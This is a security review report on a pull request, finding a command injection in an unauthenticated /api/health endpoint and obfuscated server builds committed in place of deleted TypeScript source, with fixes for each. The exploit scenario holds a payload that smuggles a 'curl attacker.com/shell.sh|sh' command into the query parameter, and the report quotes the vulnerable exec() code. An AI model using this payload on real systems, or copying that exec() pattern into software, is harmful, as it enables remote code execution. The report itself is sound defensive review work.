## Vuln 1: Command Injection — `server/dist/index.js` (`/api/health`)

- **Severity:** High
- **Confidence:** 9/10
- **Category:** `command_injection`

### Description

The `/api/health` endpoint passes the `service` query parameter directly into a shell `exec()` call without any sanitization or whitelisting. The original TypeScript source (deleted in this PR) contained:

```ts
const service = (req.query.service as string) || "api.themoviedb.org";
exec(`ping -c 1 -W 2 ${service}`, ...);
```

The obfuscated `server/dist/index.js` committed in this PR was compiled from that source and retains the same runtime behavior. The endpoint is unauthenticated.

### Exploit Scenario

An attacker sends:

```
GET /api/health?service=;curl+attacker.com/shell.sh|sh
```

The shell interprets the semicolon as a command separator and executes arbitrary OS commands with the Node.js process's privileges. No authentication or prior access is required.

### Recommendation

Replace `exec()` with `execFile()` using an argument array to prevent shell interpretation:

```ts
import { execFile } from "child_process";

const ALLOWED_HOSTS = /^[a-zA-Z0-9.\-]+$/;
if (!ALLOWED_HOSTS.test(service)) return res.status(400).json({ error: "Invalid host" });

execFile("ping", ["-c", "1", "-W", "2", service], (err, stdout) => { ... });
```

## Vuln 2: Unauditable Obfuscated Production Code — `server/dist/*.js`

- **Severity:** High
- **Confidence:** 9/10
- **Category:** `supply_chain_integrity`

### Description

This PR deletes all TypeScript source files (`server/index.ts`, `server/middleware/auth.ts`, `server/routes/auth.ts`, `server/routes/reviews.ts`, `server/routes/watchlist.ts`) and commits obfuscated JavaScript builds in their place. The `.gitignore` was simultaneously modified with `!server/dist` to force-include the `dist/` folder in version control. The obfuscated code uses a heavy obfuscation pattern — hex-encoded string arrays, self-defending IIFE, and full identifier mangling — that makes the entire server codebase impossible to audit:

```js

  while(!![]){try{var _0x2a3984=parseInt(_0x4b9e61(0x1dd))/0x1*...
```

### Exploit Scenario

There is no reliable way to verify that the obfuscated JavaScript faithfully represents any known source. A malicious actor (or compromised build step) could inject a backdoor, data exfiltration routine, or credential-harvesting payload into the obfuscated bundle with no possibility of detection through code review or standard static analysis. This concern is compounded by the confirmed command injection in Vuln 1 — if that vulnerability exists in the bundle, others may as well, with no means to enumerate them.

### Recommendation

- Restore TypeScript source files to version control. Build artifacts should never be the sole committed representation of server logic.
- Generate the `dist/` output at deploy time from auditable source (e.g., in CI/CD), and keep it in `.gitignore`.
- If obfuscation is a product requirement, maintain a separate auditable source-of-truth branch and document the build pipeline that produces the obfuscated output so the transformation can be verified.
